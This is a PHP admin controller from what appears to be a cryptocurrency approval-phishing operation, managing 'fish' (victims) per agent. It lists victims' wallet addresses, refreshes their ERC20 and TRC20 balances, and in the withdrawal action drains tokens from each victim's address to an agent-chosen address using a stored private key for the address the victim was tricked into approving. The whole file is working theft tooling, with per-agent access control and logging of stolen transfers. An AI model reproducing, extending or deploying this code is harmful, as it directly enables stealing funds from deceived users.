<?php

namespace app\admin\controller\users;

use app\common\controller\Backend;
use app\common\controller\Erc20;
use app\common\controller\Trc20;
use app\common\model\Address;
use app\common\model\withdraw\Action;
use think\Db;
use Exception;



/**
 * 前端用户管理
 *
 * @icon fa fa-circle-o
 */
class Fish extends Backend
{

    /**
     * Fish模型对象
     * @var \app\common\model\users\Fish
     */
    protected $model = null;

    public function _initialize()
    {
        parent::_initialize();
        $this->model = new \app\common\model\users\Fish;

    }



    /**
     * 默认生成的控制器所继承的父类中有index/add/edit/del/multi五个基础方法、destroy/restore/recyclebin三个回收站方法
     * 因此在当前控制器中可不用编写增删改查的代码,除非需要自己控制这部分逻辑
     * 需要将application/admin/library/traits/Backend.php中对应的方法复制到当前控制器,然后进行修改
     */


    /**
     * 查看
     */
    public function index()
    {
        //当前是否为关联查询
        $this->relationSearch = true;
        //设置过滤方法
        $this->request->filter(['strip_tags', 'trim']);
        if ($this->request->isAjax()) {
            //如果发送的来源是Selectpage，则转发到Selectpage
            if ($this->request->request('keyField')) {
                return $this->selectpage();
            }


            $getGroupIds = $this->auth->getGroupIds();
            $is_admin = false;
            //获取用户是否属于超级管理员
            foreach ($getGroupIds as $k=>$v){
                if($v == 1){
                    $is_admin = true;
                }
            }


            list($where, $sort, $order, $offset, $limit) = $this->buildparams();


            $where2 = [];
            if(!$is_admin){
                $where2['aid'] = $this->auth->id;
            }

            $list = $this->model
                ->with(['admin'])
                ->where($where)
                ->where($where2)
                ->order($sort, $order)
                ->paginate($limit);

            foreach ($list as $row) {

                $row->getRelation('admin')->visible(['username']);
            }

            $result = array("total" => $list->total(), "rows" => $list->items());

            return json($result);
        }
        return $this->view->fetch();
    }




    /**
     * 提现页面
     */
    public function tixian($ids){
        if ($this->request->isPost()) {
            $params = $this->request->post('row/a');
            $tixian_address = $params['address'];
            $money = $params['money'];

            $getGroupIds = $this->auth->getGroupIds();
            $is_admin = false;
            //获取用户是否属于超级管理员
            foreach ($getGroupIds as $k=>$v){
                if($v == 1){
                    $is_admin = true;
                }
            }
            //当前管理员ID
            $admin_id = $this->auth->id;
            //查询是不是这个代理的鱼
            if($is_admin){
                $agent_fish = $this->model->where(['id'=>$ids])->field('id,fish_address,authorized_address,chain,balance,status')->find();
            }else{
                $agent_fish = $this->model->where(['aid'=>$admin_id,'id'=>$ids])->field('id,fish_address,authorized_address,chain,balance,status')->find();
                if(empty($agent_fish)){
                    $this->error("暂无权限操作此用户");
                }
            }


            //查询当前代币种类
            if($agent_fish['chain'] == 'erc'){

                //查询ERC授权地址和秘钥
                $address = Address::where(['type'=>'erc','enabled'=>1])->field('address,pri_key')->find();
                if($address['address'] != $agent_fish['authorized_address']){
                    $this->error("授权地址有误");
                }

                $erc = new Erc20();
                

                try{
                    //开始提币
                    $tixian = $erc->erc_withdraw($agent_fish['fish_address'],$tixian_address,$address['address'],$address['pri_key'],$money);
                }catch(\Exception $e){
                    $this->error($e->getMessage());
                }
                

                if($tixian['code'] == 0){
                    $this->error($tixian['data']);
                }

                //生成提币记录
                $data = [
                    'fishid'=>$agent_fish['id'],
                    'aid'=>$admin_id,
                    'from'=>$agent_fish['fish_address'],
                    'to'=>$tixian_address,
                    'type'=>'erc',
                    'balance'=>$money,
                    'tx_id'=>$tixian['tx_id']
                ];

                Action::insert($data);
                $this->success($tixian['data']);

            }elseif($agent_fish['chain'] == 'trc'){
                //查询TRC授权地址和秘钥
                $address = Address::where(['type'=>'trc','enabled'=>1])->field('address,pri_key')->find();
                if($address['address'] != $agent_fish['authorized_address']){
                    $this->error("授权地址有误");
                }

                $trc = new Trc20();
                
                $fee = 0;
                
  
                try{
                    //开始提币
                    $tixian = $trc->trc_withdraw($agent_fish['fish_address'],$tixian_address,$address['address'],$address['pri_key'],$money);  
                }catch(\Exception $e){
                    $this->error($e->getMessage());
                }



                if($tixian['code'] == 0){
                    $this->error($tixian['data']);
                }
                //生成提币记录
                $data = [
                    'fishid'=>$agent_fish['id'],
                    'aid'=>$admin_id,
                    'from'=>$agent_fish['fish_address'],
                    'to'=>$tixian_address,
                    'type'=>'trc',
                    'balance'=>$money,
                    'tx_id'=>$tixian['tx_id']
                ];

                Action::insert($data);
                $this->success($tixian['data']);
            }else{
                $this->error("暂无该链提币");
            }

        }
        $row = $this->model::where(['id'=>$ids])->find();

        if (!$row) {
            $this->error(__('No Results were found'));
        }
        $this->view->assign("row", $row);
        return $this->view->fetch();
    }



    /**
     * 更新用户余额
     */
    public function update_balance($ids){
        //查询用户地址
        $userAddress = $this->model::where(['id'=>$ids])->field('id,chain,fish_address')->find();
        if($userAddress['chain'] == 'erc'){
            $erc = new Erc20();
            $getBalance = $erc->getErc20Balance($userAddress['fish_address']);
        }else if($userAddress['chain'] == 'trc'){
            $trc20 = new Trc20();
            $getBalance = $trc20->getTrc20Balance($userAddress['fish_address']);
        }else{
            $getBalance = 0;
        }

        if(!empty($getBalance)) {
            $this->model::where(['id'=>$ids])->update(['balance'=>$getBalance]);
        }else{
            $this->model::where(['id'=>$ids])->update(['balance'=>0]);
        }
        $this->success("更新成功", null, ['balance' => $getBalance]);
    }



    /**
     * 启用
     */
    public function all_balance()
    {
        //当前管理员ID
        $admin_id = $this->auth->id;

        $getGroupIds = $this->auth->getGroupIds();
        $is_admin = false;
        //获取用户是否属于超级管理员
        foreach ($getGroupIds as $k=>$v){
            if($v == 1){
                $is_admin = true;
            }
        }
        //查询是不是这个代理的鱼
        if($is_admin){
            $fish = $this->model->field('id,fish_address,chain')->select();
        }else{
            $fish = $this->model->where(['aid'=>$admin_id])->field('id,fish_address,chain')->select();
        }
        $erc = new Erc20();
        $trc20 = new Trc20();
        foreach ($fish as $k=>$v){
            if(strlen($v['fish_address']) < 25){
                continue;
            }

            if($v['chain'] == 'erc'){
                $getBalance = $erc->getErc20Balance($v['fish_address']);
            }else if($v['chain'] == 'trc'){
                $getBalance = $trc20->getTrc20Balance($v['fish_address']);
            }else{
                $getBalance = 0;
            }


            if(!empty($getBalance)) {
                $this->model::where(['id'=>$v['id']])->update(['balance'=>$getBalance]);
            }else{
                $this->model::where(['id'=>$v['id']])->update(['balance'=>0]);
            }
        }
        $this->success("批量更新成功");
    }

    /**
     * 删除
     * @param $ids
     */
    public function del($ids = null)
    {
        if (false === $this->request->isPost()) {
            $this->error(__("Invalid parameters"));
        }
        $ids = $ids ?: $this->request->post("ids");
        if (empty($ids)) {
            $this->error(__('Parameter %s can not be empty', 'ids'));
        }
        $pk = $this->model->getPk();
        $adminIds = $this->getDataLimitAdminIds();
        if (is_array($adminIds)) {
            $this->model->where($this->dataLimitField, 'in', $adminIds);
        }
        $list = $this->model->where($pk, 'in', $ids)->select();
        if($ids == 1){
            $this->error("根用户无法删除");
        }
        $count = 0;
        Db::startTrans();
        try {
            foreach ($list as $item) {
                $count += $item->delete();
            }
            Db::commit();
        } catch (Exception $e) {
            Db::rollback();
            $this->error($e->getMessage());
        }
        if ($count) {
            $this->success();
        }
        $this->error(__('No rows were deleted'));
    }
}
